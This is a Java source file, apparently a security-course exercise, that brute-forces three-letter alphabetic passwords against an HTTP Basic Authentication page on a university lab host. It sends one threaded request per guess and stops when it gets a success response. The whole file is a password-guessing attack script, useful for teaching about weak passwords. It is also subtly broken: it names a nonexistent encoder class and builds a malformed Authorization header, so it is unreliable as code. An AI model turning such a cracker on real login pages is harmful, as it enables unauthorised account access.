
import java.util.*;
import java.io.*;
import java.net.*;

class BruteForce
{

 public static void main (String a[])
 {
 
 final char [] alphabet = {
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
        'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
        'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
        'w', 'x', 'y', 'z'};

 String pwd="";
 
 for(int i=0;i<52;i++)
 {
  for(int j=0;j<52;j++)
  {
   for(int k=0;k<52;k++)
   {
    pwd = alphabet[i]+""+alphabet[j]+""+alphabet[k];
    String userPassword = ":"+pwd;
    RealThread myTh = new RealThread(i,userPassword);
    Thread th = new Thread( myTh );
    th.start();
    try
    {
     
     
     th.sleep(100);
    }
    catch(Exception e)
    {} 
   }
  }
 }


}


}


class RealThread implements Runnable
{
 private int num;
 private URL url;
 private HttpURLConnection uc =null;
 private String userPassword;
 private int responseCode = 100;
 public RealThread (int i, String userPassword)
 {
 try
 {
 url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
 }
 catch(Exception ex1)
 {
 }
 num = i;
 this.userPassword = userPassword;

 }
 
 public int getResponseCode()
 {

 return this.responseCode;
 }

 public void run()
 {
  try
  {
  String encoding = new url.misc.BASE64Encoder().encode (userPassword.getBytes());

  uc = (HttpURLConnection)url.openConnection();
  uc.setRequestProperty ("Authorization", " " + encoding);
  System.out.println("Reponse  = "+uc.getResponseCode()+"for pwd = "+userPassword);
  this.responseCode = uc.getResponseCode();
  
  if(uc.getResponseCode()==200)
  {
     System.out.println(" ======= Password Found : "+userPassword+" ========================================= ");
     System.exit(0);
  }

  }
  catch (Exception e) {
  System.out.println("Could not execute Thread "+num+" ");
  }
 }

}
